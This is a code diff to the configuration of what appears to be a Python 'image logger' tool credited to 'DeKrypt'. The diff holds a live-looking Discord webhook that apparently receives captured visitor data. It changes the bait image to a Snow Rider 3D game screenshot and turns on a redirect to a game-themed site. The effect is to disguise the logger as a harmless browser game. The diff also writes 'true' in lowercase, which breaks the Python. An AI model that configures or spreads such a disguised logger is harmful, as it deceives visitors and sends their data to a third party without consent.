@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1239060516945526864/n3UiUiP1Jaiz8J0-fI2ibBdQgkLOKzNMdFJVFU76YfrMpSgLTqPTqIu9aK-NAL3Kkfj6",
-    "image": "https://images-opensocial.googleusercontent.com/gadgets/ifr?url=https://cdn.jsdelivr.net/gh/sk1bx/89574567@71f165531792ae450fe0a522a52ba4e827344de2/sr3d.xml&container=ig", # You can also have a custom image by using a URL argument
+    "image": "https://gamerjournalist.com/wp-content/uploads/2022/12/Snow-Rider-3D-Start-Screen.png?resize=768", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": true, # Redirect to a webpage?
+        "page": "https://snowrider3d-game.vercel.app" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
